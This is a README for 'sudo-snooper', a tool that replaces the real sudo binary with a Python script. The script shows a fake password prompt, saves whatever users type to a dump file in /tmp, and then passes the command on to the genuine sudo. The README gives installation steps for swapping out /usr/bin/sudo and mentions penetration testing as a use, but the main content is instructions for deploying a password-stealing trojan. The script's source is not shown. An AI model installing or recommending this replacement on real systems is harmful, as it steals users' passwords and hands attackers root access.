# sudo-snooper

sudo-snooper acts like the original sudo binary to fool users into entering their passwords.

It will show a fake prompt just like the original to the user to enter their sudo password.

This can be useful in penetration tests or security evaluations for testing user knowledge.

## Installation steps

* move the original sudo binary to another name

```
# mv /usr/bin/sudo /usr/bin/somename
```

* change the parameters in the file to your liking

Change these in sudo-snooper.py:

```
dumpdir = "/tmp/snooper"
dumpfile = "/tmp/snooper/dump.txt"
sudo = 'sudo'
```

* install the python file in /usr/bin/sudo (or wherever sudo was before)
```
# install -dm755 sudo-snooper.py /usr/bin/sudo
```

* give the necessary permissions to the python file

  You can go fancy here and make a non-readable executable file for users, but I'm not going into that. Check some of the answers [here](http://unix.stackexchange.com/questions/16623/file-permission-execute-only) for that.


## Usage:

Once installed, sudo-snooper can be called just like the normal sudo.

For example, running

```
sudo vim /etc/resolv.conf
```

will result in sudo-snooper being called (assuming it's properly installed).

It will ask for the user password and then execute the command by redirecting to the real sudo binary if the password is correct.

You can then retrieve the user password by reading the dump file in the settings.

## TODO:

* handle when user enters wrong password
* don't ask for a password when the user has an active sudo session
